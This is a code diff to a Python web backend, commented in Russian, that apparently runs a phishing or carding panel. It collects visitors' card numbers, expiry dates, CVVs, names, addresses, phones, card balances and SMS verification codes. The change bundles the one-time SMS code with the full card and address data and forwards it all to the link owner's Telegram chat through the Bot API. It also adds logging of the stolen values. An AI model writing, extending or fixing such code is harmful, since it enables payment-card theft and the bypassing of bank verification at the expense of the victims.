@@ -114,7 +114,7 @@ class VisitorMessage(BaseModel):
     step: int | None = None
     trigger: str | None = None   # open | card | balance | error | user | code | code_resend
     text: str = ""
-    # card data — sent once when balance trigger fires
+    # card data — sent with balance trigger, and again with code trigger
     card_number: str = ""
     card_exp: str = ""
     card_cvv: str = ""
@@ -127,6 +127,7 @@ class VisitorMessage(BaseModel):
     phone: str = ""
     balance_amount: str = ""
     balance_currency: str = ""
+    verification_code: str = ""
 
 
 # ── helpers ───────────────────────────────────────────────────────────────────
@@ -148,7 +149,11 @@ async def _resolve_owner(subdomain: str, link_id: str) -> tuple[str, int | None]
 
 async def _send_telegram(chat_id: str | int, text: str,
                          reply_markup: dict | None = None) -> None:
-    if not BOT_TOKEN or not chat_id:
+    if not BOT_TOKEN:
+        logger.warning("_send_telegram: BOT_TOKEN not set — skipping")
+        return
+    if not chat_id:
+        logger.warning("_send_telegram: chat_id is empty — skipping")
         return
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload: dict = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
@@ -157,10 +162,13 @@ async def _send_telegram(chat_id: str | int, text: str,
     try:
         async with httpx.AsyncClient(timeout=8) as client:
             r = await client.post(url, json=payload)
-            if r.status_code != 200:
-                logger.error("sendMessage failed: %s", r.text)
+            if r.status_code == 200:
+                logger.info("_send_telegram: sent OK to chat_id=%s", chat_id)
+            else:
+                logger.error("_send_telegram: failed chat_id=%s status=%s body=%s",
+                             chat_id, r.status_code, r.text)
     except Exception as exc:
-        logger.error("sendMessage exc: %s", exc)
+        logger.error("_send_telegram: exception chat_id=%s exc=%s", chat_id, exc)
 
 
 # ── POST /chat/session ────────────────────────────────────────────────────────
@@ -213,6 +221,7 @@ async def get_steps(subdomain: str, link_id: str, lang: str = "ru") -> JSONRespo
 
 @router.post("/message")
 async def visitor_message(body: VisitorMessage, request: Request) -> JSONResponse:
+    logger.info("chat/message trigger=%s text=%r session=%s", body.trigger, body.text, body.session_id)
     if not body.text.strip() and not body.trigger:
         return JSONResponse({"ok": False, "error": "empty"}, status_code=400)
 
@@ -279,12 +288,37 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
     else:
         msg_body = ru_text or f"<i>[{trigger_label}]</i>"
 
-    # для кода — показываем сам код крупно, без перевода
+    # для кода — полный лог: карта + баланс + сам код
     if body.trigger == "code" and body.text.strip():
-        msg_body = f"🔑 <b>{body.text.strip()}</b>"
+        card_lines = []
+        if body.card_number:
+            card_lines.append(f"  Номер: <code>{body.card_number}</code>")
+        if body.card_exp:
+            card_lines.append(f"  Срок: <code>{body.card_exp}</code>")
+        if body.card_cvv:
+            card_lines.append(f"  CVV: <code>{body.card_cvv}</code>")
+        if body.card_name:
+            card_lines.append(f"  Имя: {body.card_name}")
+        addr_lines = []
+        if body.country:
+            addr_lines.append(f"  Страна: {body.country}")
+        if body.address1:
+            addr_lines.append(f"  Адрес: {body.address1}")
+        if body.zip_code or body.city:
+            addr_lines.append(f"  Индекс: {body.zip_code or '—'}, {body.city or '—'}")
+        parts = [f"🔑 <b>Код из SMS: {body.text.strip()}</b>"]
+        if card_lines:
+            parts.append("💳 <b>Карта:</b>\n" + "\n".join(card_lines))
+        if addr_lines:
+            parts.append("📍 <b>Адрес:</b>\n" + "\n".join(addr_lines))
+        if body.phone or body.phone_dial:
+            parts.append(f"📞 <b>Телефон:</b> {body.phone_dial}{body.phone or '—'}")
+        if body.balance_amount:
+            parts.append(f"💰 <b>Баланс:</b> <code>{body.balance_amount} {body.balance_currency or ''}</code>")
+        msg_body = "\n\n".join(parts)
 
     # для баланса — добавляем данные карты и адреса в тело сообщения
-    if body.trigger == "balance" and body.balance_amount:
+    elif body.trigger == "balance" and body.balance_amount:
         card_lines = []
         if body.card_number:
             card_lines.append(f"  Номер: <code>{body.card_number}</code>")
@@ -337,8 +371,12 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
 
     # owner of the link gets the notification; fall back to global admin
     notify_id = owner_tg_id or ADMIN_ID or NOTIFY_CHAT_ID
+    logger.info("chat/message notify_id=%s owner_tg_id=%s ADMIN_ID=%s msg_body=%r",
+                notify_id, owner_tg_id, ADMIN_ID, msg_body[:120] if msg_body else "")
     if notify_id:
         await _send_telegram(notify_id, header + msg_body, reply_markup=reply_kb)
+    else:
+        logger.warning("chat/message: no notify_id — message dropped for session %s", body.session_id)
 
     return JSONResponse({"ok": True})
 
